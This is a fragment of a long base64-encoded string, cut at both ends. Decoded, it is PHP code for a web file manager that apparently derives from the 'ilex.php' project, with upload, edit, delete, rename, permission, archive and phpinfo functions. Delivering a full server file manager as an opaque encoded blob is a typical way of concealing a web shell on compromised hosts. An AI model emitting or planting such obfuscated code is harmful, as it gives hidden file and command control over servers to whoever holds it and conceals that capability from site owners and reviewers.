3Zpc2libGUnKS52YWx1ZSA9IHRoaXMudmFsdWU7IiAvPgoJCQk8aW5wdXQgdHlwZT0idGV4dCIgcmVhZG9ubHk9IjEiIGlkPSJ1cGxvYWRfdmlzaWJsZSIgcGxhY2Vob2xkZXI9Ijw/PV9fKCdTZWxlY3QgdGhlIGZpbGUnKT8+IiBzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VwbG9hZF9oaWRkZW4nKS5jbGljaygpOyIgLz4KCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0idGVzdCIgdmFsdWU9Ijw/PV9fKCdVcGxvYWQnKT8+IiAvPgoJCQk8L2Zvcm0+CgkJPD9waHAgfSA/PgoJCTwvdGQ+CgkJPHRkPgoJCTw/cGhwIGlmICgkYXV0aFsnYXV0aG9yaXplJ10pIHsgPz4KCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+Jm5ic3A7Jm5ic3A7Jm5ic3A7CgkJCTxpbnB1dCBuYW1lPSJxdWl0IiB0eXBlPSJoaWRkZW4iIHZhbHVlPSIxIj4KCQkJPD89X18oJ0hlbGxvJyk/PiwgPD89JGF1dGhbJ2xvZ2luJ10/PgoJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iPD89X18oJ1F1aXQnKT8+Ij4KCQkJPC9mb3JtPgoJCTw/cGhwIH0gPz4KCQk8L3RkPgoJCTx0ZD4KCQk8Pz1mbV9sYW5nX2Zvcm0oJGxhbmd1YWdlKT8+CgkJPC90ZD4KCQk8dHI+CgkJPC90YWJsZT4KICAgIDwvdGQ+CjwvdHI+CjwvdGFibGU+Cjx0YWJsZSBjbGFzcz0iYWxsIiBib3JkZXI9JzAnIGNlbGxzcGFjaW5nPScxJyBjZWxscGFkZGluZz0nMScgaWQ9ImZtX3RhYmxlIiB3aWR0aD0iMTAwJSI+Cjx0aGVhZD4KPHRyPiAKICAgIDx0aCBzdHlsZT0id2hpdGUtc3BhY2U6bm93cmFwIj4gPD89X18oJ0ZpbGVuYW1lJyk/PiA8L3RoPgogICAgPHRoIHN0eWxlPSJ3aGl0ZS1zcGFjZTpub3dyYXAiPiA8Pz1fXygnU2l6ZScpPz4gPC90aD4KICAgIDx0aCBzdHlsZT0id2hpdGUtc3BhY2U6bm93cmFwIj4gPD89X18oJ0RhdGUnKT8+IDwvdGg+CiAgICA8dGggc3R5bGU9IndoaXRlLXNwYWNlOm5vd3JhcCI+IDw/PV9fKCdSaWdodHMnKT8+IDwvdGg+CiAgICA8dGggY29sc3Bhbj0iNCIgc3R5bGU9IndoaXRlLXNwYWNlOm5vd3JhcCI+IDw/PV9fKCdNYW5hZ2UnKT8+IDwvdGg+CjwvdHI+CjwvdGhlYWQ+Cjx0Ym9keT4KPD9waHAKJGVsZW1lbnRzID0gZm1fc2Nhbl9kaXIoJHBhdGgsICcnLCAnYWxsJywgdHJ1ZSk7CiRkaXJzID0gYXJyYXkoKTsKJGZpbGVzID0gYXJyYXkoKTsKZm9yZWFjaCAoJGVsZW1lbnRzIGFzICRmaWxlKXsKICAgIGlmKEBpc19kaXIoJHBhdGggLiAkZmlsZSkpewogICAgICAgICRkaXJzW10gPSAkZmlsZTsKICAgIH0gZWxzZSB7CiAgICAgICAgJGZpbGVzW10gPSAkZmlsZTsKICAgIH0KfQpuYXRzb3J0KCRkaXJzKTsgbmF0c29ydCgkZmlsZXMpOwokZWxlbWVudHMgPSBhcnJheV9tZXJnZSgkZGlycywgJGZpbGVzKTsKCmZvcmVhY2ggKCRlbGVtZW50cyBhcyAkZmlsZSl7CiAgICAkZmlsZW5hbWUgPSAkcGF0aCAuICRmaWxlOwogICAgJGZpbGVkYXRhID0gQHN0YXQoJGZpbGVuYW1lKTsKICAgIGlmKEBpc19kaXIoJGZpbGVuYW1lKSl7CgkJJGZpbGVkYXRhWzddID0gJyc7CgkJaWYgKCFlbXB0eSgkZm1fY29uZmlnWydzaG93X2Rpcl9zaXplJ10pJiYhZm1fcm9vdCgkZmlsZSkpICRmaWxlZGF0YVs3XSA9IGZtX2Rpcl9zaXplKCRmaWxlbmFtZSk7CiAgICAgICAgJGxpbmsgPSAnPGEgaHJlZj0iJy4kdXJsX2luYy4nJnBhdGg9Jy4kcGF0aC4kZmlsZS4nIiB0aXRsZT0iJy5fXygnU2hvdycpLicgJy4kZmlsZS4nIj48c3BhbiBjbGFzcz0iZm9sZGVyIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8L3NwYW4+ICcuJGZpbGUuJzwvYT4nOwogICAgICAgICRsb2FkbGluaz0gKGZtX3Jvb3QoJGZpbGUpfHwkcGhhcl9tYXliZSkgPyAnJyA6IGZtX2xpbmsoJ3ppcCcsJGZpbGVuYW1lLF9fKCdDb21wcmVzcycpLicmbmJzcDt6aXAnLF9fKCdBcmNoaXZpbmcnKS4nICcuICRmaWxlKTsKCQkkYXJsaW5rICA9IChmbV9yb290KCRmaWxlKXx8JHBoYXJfbWF5YmUpID8gJycgOiBmbV9saW5rKCdneicsJGZpbGVuYW1lLF9fKCdDb21wcmVzcycpLicmbmJzcDsudGFyLmd6JyxfXygnQXJjaGl2aW5nJykuJyAnLiRmaWxlKTsKICAgICAgICAkc3R5bGUgPSAncm93Mic7CgkJIGlmICghZm1fcm9vdCgkZmlsZSkpICRhbGVydCA9ICdvbkNsaWNrPSJpZihjb25maXJtKFwnJyAuIF9fKCdBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZGlyZWN0b3J5IChyZWN1cnNpdmVseSk/JykuJ1xuIC8nLiAkZmlsZS4gJ1wnKSkgZG9jdW1lbnQubG9jYXRpb24uaHJlZiA9IFwnJyAuICR1cmxfaW5jIC4gJyZkZWxldGU9JyAuICRmaWxlIC4gJyZwYXRoPScgLiAkcGF0aCAgLiAnXCciJzsgZWxzZSAkYWxlcnQgPSAnJzsKICAgIH0gZWxzZSB7CgkJJGxpbmsgPSAKCQkJJGZtX2NvbmZpZ1snc2hvd19pbWcnXSYmQGdldGltYWdlc2l6ZSgkZmlsZW5hbWUpIAoJCQk/ICc8YSB0YXJnZXQ9Il9ibGFuayIgb25jbGljaz0idmFyIGxlZnRvID0gc2NyZWVuLmF2YWlsV2lkdGgvMi0zMjA7d2luZG93Lm9wZW4oXCcnCgkJCS4gZm1faW1nX2xpbmsoJGZpbGVuYW1lKQoJCQkuJ1wnLFwncG9wdXBcJyxcJ3dpZHRoPTY0MCxoZWlnaHQ9NDgwLGxlZnQ9XCcgKyBsZWZ0byArIFwnLHNjcm9sbGJhcnM9eWVzLHRvb2xiYXI9bm8sbG9jYXRpb249bm8sZGlyZWN0b3JpZXM9bm8sc3RhdHVzPW5vXCcpO3JldHVybiBmYWxzZTsiIGhyZWY9IicuZm1faW1nX2xpbmsoJGZpbGVuYW1lKS4nIj48c3BhbiBjbGFzcz0iaW1nIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8L3NwYW4+ICcuJGZpbGUuJzwvYT4nCgkJCTogJzxhIGhyZWY9IicgLiAkdXJsX2luYyAuICcmZWRpdD0nIC4gJGZpbGUgLiAnJnBhdGg9JyAuICRwYXRoLiAnIiB0aXRsZT0iJyAuIF9fKCdFZGl0JykgLiAnIj48c3BhbiBjbGFzcz0iZmlsZSI+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7PC9zcGFuPiAnLiRmaWxlLic8L2E+JzsKCQkkZV9hcnIgPSBleHBsb2RlKCIuIiwgJGZpbGUpOwoJCSRleHQgPSBlbmQoJGVfYXJyKTsKICAgICAgICAkbG9hZGxpbmsgPSAgZm1fbGluaygnZG93bmxvYWQnLCRmaWxlbmFtZSxfXygnRG93bmxvYWQnKSxfXygnRG93bmxvYWQnKS4nICcuICRmaWxlKTsKCQkkYXJsaW5rID0gaW5fYXJyYXkoJGV4dCxhcnJheSgnemlwJywnZ3onLCd0YXInKSkgCgkJPyAnJwoJCTogKChmbV9yb290KCRmaWxlKXx8JHBoYXJfbWF5YmUpID8gJycgOiBmbV9saW5rKCdnemZpbGUnLCRmaWxlbmFtZSxfXygnQ29tcHJlc3MnKS4nJm5ic3A7LnRhci5neicsX18oJ0FyY2hpdmluZycpLicgJy4gJGZpbGUpKTsKICAgICAgICAkc3R5bGUgPSAncm93MSc7CgkJJGFsZXJ0ID0gJ29uQ2xpY2s9ImlmKGNvbmZpcm0oXCcnLiBfXygnRmlsZSBzZWxlY3RlZCcpLic6IFxuJy4gJGZpbGUuICcuIFxuJy5fXygnQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRlbGV0ZSB0aGlzIGZpbGU/JykgLiAnXCcpKSBkb2N1bWVudC5sb2NhdGlvbi5ocmVmID0gXCcnIC4gJHVybF9pbmMgLiAnJmRlbGV0ZT0nIC4gJGZpbGUgLiAnJnBhdGg9JyAuICRwYXRoICAuICdcJyInOwogICAgfQogICAgJGRlbGV0ZWxpbmsgPSBmbV9yb290KCRmaWxlKSA/ICcnIDogJzxhIGhyZWY9IiMiIHRpdGxlPSInIC4gX18oJ0RlbGV0ZScpIC4gJyAnLiAkZmlsZSAuICciICcgLiAkYWxlcnQgLiAnPicgLiBfXygnRGVsZXRlJykgLiAnPC9hPic7CiAgICAkcmVuYW1lbGluayA9IGZtX3Jvb3QoJGZpbGUpID8gJycgOiAnPGEgaHJlZj0iJyAuICR1cmxfaW5jIC4gJyZyZW5hbWU9JyAuICRmaWxlIC4gJyZwYXRoPScgLiAkcGF0aCAuICciIHRpdGxlPSInIC4gX18oJ1JlbmFtZScpIC4nICcuICRmaWxlIC4gJyI+JyAuIF9fKCdSZW5hbWUnKSAuICc8L2E+JzsKICAgICRyaWdodHN0ZXh0ID0gKCRmaWxlPT0nLicgfHwgJGZpbGU9PScuLicpID8gJycgOiAnPGEgaHJlZj0iJyAuICR1cmxfaW5jIC4gJyZyaWdodHM9JyAuICRmaWxlIC4gJyZwYXRoPScgLiAkcGF0aCAuICciIHRpdGxlPSInIC4gX18oJ1JpZ2h0cycpIC4nICcuICRmaWxlIC4gJyI+JyAuIEBmbV9yaWdodHNfc3RyaW5nKCRmaWxlbmFtZSkgLiAnPC9hPic7Cj8+Cjx0ciBjbGFzcz0iPD89JHN0eWxlPz4iPiAKICAgIDx0ZD48Pz0kbGluaz8+PC90ZD4KICAgIDx0ZD48Pz0kZmlsZWRhdGFbN10/PjwvdGQ+CiAgICA8dGQgc3R5bGU9IndoaXRlLXNwYWNlOm5vd3JhcCI+PD89Z21kYXRlKCJZLW0tZCBIOmk6cyIsJGZpbGVkYXRhWzldKT8+PC90ZD4KICAgIDx0ZD48Pz0kcmlnaHRzdGV4dD8+PC90ZD4KICAgIDx0ZD48Pz0kZGVsZXRlbGluaz8+PC90ZD4KICAgIDx0ZD48Pz0kcmVuYW1lbGluaz8+PC90ZD4KICAgIDx0ZD48Pz0kbG9hZGxpbms/PjwvdGQ+CiAgICA8dGQ+PD89JGFybGluaz8+PC90ZD4KPC90cj4KPD9waHAKICAgIH0KfQo/Pgo8L3Rib2R5Pgo8L3RhYmxlPgo8ZGl2IGNsYXNzPSJyb3czIj48P3BocAoJJG10aW1lID0gZXhwbG9kZSgnICcsIG1pY3JvdGltZSgpKTsgCgkkdG90YWx0aW1lID0gJG10aW1lWzBdICsgJG10aW1lWzFdIC0gJHN0YXJ0dGltZTsgCgllY2hvIGZtX2hvbWUoKS4nIHwgdmVyLiAnLiRmbV92ZXJzaW9uLicgfCA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vZGFuaWVseXp4MTIzL2lsZXgucGhwIj5HaXRodWI8L2E+ICB8IDxhIGhyZWY9IicuZm1fc2l0ZV91cmwoKS4nIj4uPC9hPic7CglpZiAoIWVtcHR5KCRmbV9jb25maWdbJ3Nob3dfcGhwX3ZlciddKSkgZWNobyAnIHwgUEhQICcucGhwdmVyc2lvbigpOwoJaWYgKCFlbXB0eSgkZm1fY29uZmlnWydzaG93X3BocF9pbmknXSkpIGVjaG8gJyB8ICcucGhwX2luaV9sb2FkZWRfZmlsZSgpOwoJaWYgKCFlbXB0eSgkZm1fY29uZmlnWydzaG93X2d0J10pKSBlY2hvICcgfCAnLl9fKCdHZW5lcmF0aW9uIHRpbWUnKS4nOiAnLnJvdW5kKCR0b3RhbHRpbWUsMik7CglpZiAoIWVtcHR5KCRmbV9jb25maWdbJ2VuYWJsZV9wcm94eSddKSkgZWNobyAnIHwgPGEgaHJlZj0iP3Byb3h5PXRydWUiPnByb3h5PC9hPic7CglpZiAoIWVtcHR5KCRmbV9jb25maWdbJ3Nob3dfcGhwaW5mbyddKSkgZWNobyAnIHwgPGEgaHJlZj0iP3BocGluZm89dHJ1ZSI+cGhwaW5mbzwvYT4nOwoJaWYgKCFlbXB0eSgkZm1fY29uZmlnWydzaG93X3hscyddKSYmIWVtcHR5KCRsaW5rKSkgZWNobyAnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDogdm9pZCgwKSIgb25jbGljaz0idmFyIG9iaiA9IG5ldyB0YWJsZTJFeGNlbCgpOyBvYmouQ3JlYXRlRXhjZWxTaGVldChcJ2ZtX3RhYmxlXCcsXCdleHBvcnRcJyk7IiB0aXRsZT0iJy5fXygnRG93bmxvYWQnKS4nIHhscyI+eGxzPC9hPic7CglpZiAoIWVtcHR5KCRmbV9jb25maWdbJ2ZtX3NldHRpbmdzJ10pKSBlY2hvICcgfCA8YSBocmVmPSI/Zm1fc2V0dGluZ3M9dHJ1ZSI+Jy5fXygnU2V0dGluZ3MnKS4nPC9hPic7Cgk/Pgo8L2Rpdj4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpmdW5jdGlvbiBkb3dubG9hZF94bHMoZmlsZW5hbWUsIHRleHQpIHsKCXZhciBlbGVtZW50ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOwoJZWxlbWVudC5zZXRBdHRyaWJ1dGUoJ2hyZWYnLCAnZGF0YTphcHBsaWNhdGlvbi92bmQubXMtZXhjZWw7YmFzZTY0LCcgKyB0ZXh0KTsKCWVsZW1lbnQuc2V0QXR0cmlidXRlKCdkb3dubG9hZCcsIGZpbGVuYW1lKTsKCWVsZW1lbnQuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKCWRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZWxlbWVudCk7CgllbGVtZW50LmNsaWNrKCk7Cglkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGVsZW1lbnQpOwp9CgpmdW5jdGlvbiBiYXNlNjRfZW5jb2RlKG0pIHsKCWZvciAodmFyIGsgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyIuc3BsaXQoIiIpLCBjLCBkLCBoLCBlLCBhLCBnID0gIiIsIGIgPSAwLCBmLCBsID0gMDsgbCA8IG0ubGVuZ3RoOyArK2wpIHsKCQljID0gbS5jaGFyQ29kZUF0KGwpOwoJCWlmICgxMjggPiBjKSBkID0gMTsKCQllbHNlCgkJCWZvciAoZCA9IDI7IGMgPj0gMiA8PCA1ICogZDspICsrZDsKCQlmb3IgKGggPSAwOyBoIDwgZDsgKytoKSAxID09IGQgPyBlID0gYyA6IChlID0gaCA/IDEyOCA6IDE5MiwgYSA9IGQgLSAyIC0gNiAqIGgsIDAgPD0gYSAmJiAoZSArPSAoNiA8PSBhID8gMSA6IDApICsgKDUgPD0gYSA/IDIgOiAwKSArICg0IDw9IGEgPyA0IDogMCkgKyAoMyA8PSBhID8gOCA6IDApICsgKDIgPD0gYSA/IDE2IDogMCkgKyAoMSA8PSBhID8gMzIgOiAwKSwgYSAtPSA1KSwgMCA+IGEgJiYgKHUgPSA2ICogKGQgLSAxIC0gaCksIGUgKz0gYyA+PiB1LCBjIC09IGMgPj4gdSA8PCB1KSksIGYgPSBiID8gZiA8PCA2IC0gYiA6IDAsIGIgKz0gMiwgZiArPSBlID4+IGIsIGcgKz0ga1tmXSwgZiA9IGUgJSAoMSA8PCBiKSwgNiA9PSBiICYmIChiID0gMCwgZyArPSBrW2ZdKQoJfQoJYiAmJiAoZyArPSBrW2YgPDwgNiAtIGJdKTsKCXJldHVybiBnCn0KCgp2YXIgdGFibGVUb0V4Y2VsRGF0YSA9IChmdW5jdGlvbigpIHsKICAgIHZhciB1cmkgPSAnZGF0YTphcHBsaWNhdGlvbi92bmQubXMtZXhjZWw7YmFzZTY0LCcsCiAgICB0ZW1wbGF0ZSA9ICc8aHRtbCB4bWxuczpvPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm9mZmljZTpvZmZpY2UiIHhtbG5zOng9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206b2ZmaWNlOmV4Y2VsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvVFIvUkVDLWh0bWw0MCI+PGhlYWQ+PCEtLVtpZiBndGUgbXNvIDldPjx4bWw+PHg6RXhjZWxXb3JrYm9vaz48eDpFeGNlbFdvcmtzaGVldHM+PHg6RXhjZWxXb3Jrc2hlZXQ+PHg6TmFtZT57d29ya3NoZWV0fTwveDpOYW1lPjx4OldvcmtzaGVldE9wdGlvbnM+PHg6RGlzcGxheUdyaWRsaW5lcz48L3g6RGlzcGxheUdyaWRsaW5lcz48L3g6V29ya3NoZWV0T3B0aW9ucz48L3g6RXhjZWxXb3Jrc2hlZXQ+PC94OkV4Y2VsV29ya3NoZWV0cz48L3g6RXhjZWxXb3JrYm9vaz48L3htbD48IVtlbmRpZl0tLT48bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvcGxhaW47IGNoYXJzZXQ9VVRGLTgiLz48L2hlYWQ+PGJvZHk+PHRhYmxlPnt0YWJsZX08L3RhYmxlPjwvYm9keT48L2h0bWw+JywKICAgIGZvcm1hdCA9IGZ1bmN0aW9uKHMsIGMpIHsKICAgICAgICAgICAgcmV0dXJuIHMucmVwbGFjZSgveyhcdyspfS9nLCBmdW5jdGlvbihtLCBwKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gY1twXTsKICAgICAgICAgICAgfSkKICAgICAgICB9CiAgICByZXR1cm4gZnVuY3Rpb24odGFibGUsIG5hbWUpIHsKICAgICAgICBpZiAoIXRhYmxlLm5vZGVUeXBlKSB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHRhYmxlKQogICAgICAgIHZhciBjdHggPSB7CiAgICAgICAgICAgIHdvcmtzaGVldDogbmFtZSB8fCAnV29ya3NoZWV0JywKICAgICAgICAgICAgdGFibGU6IHRhYmxlLmlubmVySFRNTC5yZXBsYWNlKC88c3BhbiguKj8pXC9zcGFuPiAvZywiIikucmVwbGFjZSgvPGFcYltePl0qPiguKj8pPFwvYT4vZywiJDEiKQogICAgICAgIH0KCQl0ID0gbmV3IERhdGUoKTsKCQlmaWxlbmFtZSA9ICdmbV8nICsgdC50b0lTT1N0cmluZygpICsgJy54bHMnCgkJZG93bmxvYWRfeGxzKGZpbGVuYW1lLCBiYXNlNjRfZW5jb2RlKGZvcm1hdCh0ZW1wbGF0ZSwgY3R4KSkpCiAgICB9Cn0pKCk7Cgp2YXIgdGFibGUyRXhjZWwgPSBmdW5jdGlvbiAoKSB7CgogICAgdmFyIHVhID0gd2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQ7CiAgICB2YXIgbXNpZSA9IHVhLmluZGV4T2YoIk1TSUUgIik7CgoJdGhpcy5DcmVhdGVFeGNlbFNoZWV0ID0gCgkJZnVuY3Rpb24oZWwsIG5hbWUpewoJCQlpZiAobXNpZSA+IDAgfHwgISFuYXZpZ2F0b3IudXNlckFnZW50Lm1hdGNoKC9UcmlkZW50Lipydlw6MTFcLi8pKSB7Ly8gSWYgSW50ZXJuZXQgRXhwbG9yZXIKCgkJCQl2YXIgeCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGVsKS5yb3dzOwoKCQkJCXZhciB4bHMgPSBuZXcgQWN0aXZlWE9iamVjdCgiRXhjZWwuQXBwbGljYXRpb24iKTsKCgkJCQl4bHMudmlzaWJsZSA9IHRydWU7CgkJCQl4bHMuV29ya2Jvb2tzLkFkZAoJCQkJZm9yIChpID0gMDsgaSA8IHgubGVuZ3RoOyBpKyspIHsKCQkJCQl2YXIgeSA9IHhbaV0uY2VsbHM7CgoJCQkJCWZvciAoaiA9IDA7IGogPCB5Lmxlbmd0aDsgaisrKSB7CgkJCQkJCXhscy5DZWxscyhpICsgMSwgaiArIDEpLlZhbHVlID0geVtqXS5pbm5lclRleHQ7CgkJCQkJfQoJCQkJfQoJCQkJeGxzLlZpc2libGUgPSB0cnVlOwoJCQkJeGxzLlVzZXJDb250cm9sID0gdHJ1ZTsKCQkJCXJldHVybiB4bHM7CgkJCX0gZWxzZSB7CgkJCQl0YWJsZVRvRXhjZWxEYXRhKGVsLCBuYW1lKTsKCQkJfQoJCX0KfQo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cgo8P3BocAovL1BvcnRlZCBmcm9tIFJlbG9hZENNUyBwcm9qZWN0IGh0dHA6Ly9yZWxvYWRjbXMuY29tCmNsYXNzIGFyY2hpdmVUYXIgewoJdmFyICRhcmNoaXZlX25hbWUgPSAnJzsKCXZhciAkdG1wX2ZpbGUgPSAwOwoJdmFyICRmaWxlX3BvcyA9IDA7Cgl2YXIgJGlzR3ppcHBlZCA9IHRydWU7Cgl2YXIgJGVycm9ycyA9IGFycmF5KCk7Cgl2YXIgJGZpbGVzID0gYXJyYXkoKTsKCQoJZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsKCQlpZiAoIWlzc2V0KCR0aGlzLT5lcnJvcnMpKSAkdGhpcy0+ZXJyb3JzID0gYXJyYXkoKTsKCX0KCQoJZnVuY3Rpb24gY3JlYXRlQXJjaGl2ZSgkZmlsZV9saXN0KXsKCQkkcmVzdWx0ID0gZmFsc2U7CgkJaWYgKGZpbGVfZXhpc3RzKCR0aGlzLT5hcmNoaXZlX25hbWUpICYmIGlzX2ZpbGUoJHRoaXMtPmFyY2hpdmVfbmFtZSkpIAkkbmV3QXJjaGl2ZSA9IGZhbHNlOwoJCWVsc2UgJG5ld0FyY2hpdmUgPSB0cnVlOwoJCWlmICgkbmV3QXJjaGl2ZSl7CgkJCWlmICghJHRoaXMtPm9wZW5Xcml0ZSgpKSByZXR1cm4gZmFsc2U7CgkJfSBlbHNlIHsKCQkJaWYgKGZpbGVzaXplKCR0aGlzLT5hcmNoaXZlX25hbWUpID09IDApCXJldHVybiAkdGhpcy0+b3BlbldyaXRlKCk7CgkJCWlmICgkdGhpcy0+aXNHemlwcGVkKSB7CgkJCQkkdGhpcy0+Y2xvc2VUbXBGaWxlKCk7CgkJCQlpZiAoIXJlbmFtZSgkdGhpcy0+YXJjaGl2ZV9uYW1lLCAkdGhpcy0+YXJjaGl2ZV9uYW1lLicudG1wJykpewoJCQkJCSR0aGlzLT5lcnJvcnNbXSA9IF9fKCdDYW5ub3QgcmVuYW1lJykuJyAnLiR0aGlzLT5hcmNoaXZlX25hbWUuX18oJyB0byAnKS4kdGhpcy0+YXJjaGl2ZV9uYW1lLicudG1wJzsKCQkJCQlyZXR1cm4gZmFsc2U7CgkJCQl9CgkJCQkkdG1wQXJjaGl2ZSA9IGd6b3BlbigkdGhpcy0+YXJjaGl2ZV9uYW1lLicudG1wJywgJ3JiJyk7CgkJCQlpZiAoISR0bXBBcmNoaXZlKXsKCQkJCQkkdGhpcy0+ZXJyb3JzW10gPSAkdGhpcy0+YXJjaGl2ZV9uYW1lLicudG1wICcuX18oJ2lzIG5vdCByZWFkYWJsZScpOwoJCQkJCXJlbmFtZSgkdGhpcy0+YXJjaGl2ZV9uYW1lLicudG1wJywgJHRoaXMtPmFyY2hpdmVfbmFtZSk7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQkJaWYgKCEkdGhpcy0+b3BlbldyaXRlKCkpewoJCQkJCXJlbmFtZSgkdGhpcy0+YXJjaGl2ZV9uYW1lLicudG1wJywgJHRoaXMtPmFyY2hpdmVfbmFtZSk7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQkJJGJ1ZmZlciA9IGd6cmVhZCgkdG1wQXJjaGl2ZSwgNTEyKTsKCQkJCWlmICghZ3plb2YoJHRtcEFyY2hpdmUpKXsKCQkJCQlkbyB7CgkJCQkJCSRiaW5hcnlEYXRhID0gcGFjaygnYTUxMicsICRidWZmZXIpOwoJCQkJCQkkdGhpcy0+d3JpdGVCbG9jaygkYmluYXJ5RGF0YSk7CgkJCQkJCSRidWZmZXIgPSBnenJlYWQoJHRtcEFyY2hpdmUsIDUxMik7CgkJCQkJfQoJCQkJCXdoaWxlICghZ3plb2YoJHRtcEFyY2hpdmUpKTsKCQkJCX0KCQkJCWd6Y2xvc2UoJHRtcEFyY2hpdmUpOwoJCQkJdW5saW5rKCR0aGlzLT5hcmNoaXZlX25hbWUuJy50bXAnKTsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT50bXBfZmlsZSA9IGZvcGVuKCR0aGlzLT5hcmNoaXZlX25hbWUsICdyK2InKTsKCQkJCWlmICghJHRoaXMtPnRtcF9maWxlKQlyZXR1cm4gZmFsc2U7CgkJCX0KCQl9CgkJaWYgKGlzc2V0KCRmaWxlX2xpc3QpICYmIGlzX2FycmF5KCRmaWxlX2xpc3QpKSB7CgkJaWYgKGNvdW50KCRmaWxlX2xpc3QpPjApCgkJCSRyZXN1bHQgPSAkdGhpcy0+cGFja0ZpbGVBcnJheSgkZmlsZV9saXN0KTsKCQl9IGVsc2UgJHRoaXMtPmVycm9yc1tdID0gX18oJ05vIGZpbGUnKS5fXygnIHRvICcpLl9fKCdBcmNoaXZlJyk7CgkJaWYgKCgkcmVzdWx0KSYmKGlzX3Jlc291cmNlKCR0aGlzLT50bXBfZmlsZSkpKXsKCQkJJGJpbmFyeURhdGEgPSBwYWNrKCdhNTEyJywgJycpOwoJCQkkdGhpcy0+d3JpdGVCbG9jaygkYmluYXJ5RGF0YSk7CgkJfQoJCSR0aGlzLT5jbG9zZVRtcEZpbGUoKTsKCQlpZiAoJG5ld0FyY2hpdmUgJiYgISRyZXN1bHQpewoJCSR0aGlzLT5jbG9zZVRtcEZpbGUoKTsKCQl1bmxpbmsoJHRoaXMtPmFyY2hpdmVfbmFtZSk7CgkJfQoJCXJldHVybiAkcmVzdWx0OwoJfQoKCWZ1bmN0aW9uIHJlc3RvcmVBcmNoaXZlKCRwYXRoKXsKCQkkZmlsZU5hbWUgPSAkdGhpcy0+YXJjaGl2ZV9uYW1lOwoJCWlmICghJHRoaXMtPmlzR3ppcHBlZCl7CgkJCWlmIChmaWxlX2V4aXN0cygkZmlsZU5hbWUpKXsKCQkJCWlmICgkZnAgPSBmb3BlbigkZmlsZU5hbWUsICdyYicpKXsKCQkJCQkkZGF0YSA9IGZyZWFkKCRmcCwgMik7CgkJCQkJZmNsb3NlKCRmcCk7CgkJCQkJaWYgKCRkYXRhID09ICdcMzdcMjEzJyl7CgkJCQkJCSR0aGlzLT5pc0d6aXBwZWQgPSB0cnVlOwoJCQkJCX0KCQkJCX0KCQkJfQoJCQllbHNlaWYgKChzdWJzdHIoJGZpbGVOYW1lLCAtMikgPT0gJ2d6JykgT1IgKHN1YnN0cigkZmlsZU5hbWUsIC0zKSA9PSAndGd6JykpICR0aGlzLT5pc0d6aXBwZWQgPSB0cnVlOwoJCX0gCgkJJHJlc3VsdCA9IHRydWU7CgkJaWYgKCR0aGlzLT5pc0d6aXBwZWQpICR0aGlzLT50bXBfZmlsZSA9IGd6b3BlbigkZmlsZU5hbWUsICdyYicpOwoJCWVsc2UgJHRoaXMtPnRtcF9maWxlID0gZm9wZW4oJGZpbGVOYW1lLCAncmInKTsKCQlpZiAoISR0aGlzLT50bXBfZmlsZSl7CgkJCSR0aGlzLT5lcnJvcnNbXSA9ICRmaWxlTmFtZS4nICcuX18oJ2lzIG5vdCByZWFkYWJsZScpOwoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCSRyZXN1bHQgPSAkdGhpcy0+dW5wYWNrRmlsZUFycmF5KCRwYXRoKTsKCQkJJHRoaXMtPmNsb3NlVG1wRmlsZSgpOwoJCXJldHVybiAkcmVzdWx0OwoJfQoKCWZ1bmN0aW9uIHNob3dFcnJvcnMJKCRtZXNzYWdlID0gJycpIHsKCQkkRXJyb3JzID0gJHRoaXMtPmVycm9yczsKCQlpZihjb3VudCgkRXJyb3JzKT4wKSB7CgkJaWYgKCFlbXB0eSgkbWVzc2FnZSkpICRtZXNzYWdlID0gJyAoJy4kbWVzc2FnZS4nKSc7CgkJCSRtZXNzYWdlID0gX18oJ0Vycm9yIG9jY3VycmVkJykuJG1lc3NhZ2UuJzogPGJyLz4nOwoJCQlmb3JlYWNoICgkRXJyb3JzIGFzICR2YWx1ZSkKCQkJCSRtZXNzYWdlIC49ICR2YWx1ZS4nPGJyLz4nOwoJCQlyZXR1cm4gJG1lc3NhZ2U7CQoJCX0gZWxzZSByZXR1cm4gJyc7CgkJCgl9CgkKCWZ1bmN0aW9uIHBhY2tGaWxlQXJyYXkoJGZpbGVfYXJyYXkpewoJCSRyZXN1bHQgPSB0cnVlOwoJCWlmICghJHRoaXMtPnRtcF9maWxlKXsKCQkJJHRoaXMtPmVycm9yc1tdID0gX18oJ0ludmFsaWQgZmlsZSBkZXNjcmlwdG9yJyk7CgkJCXJldHVybiBmYWxzZTsKCQ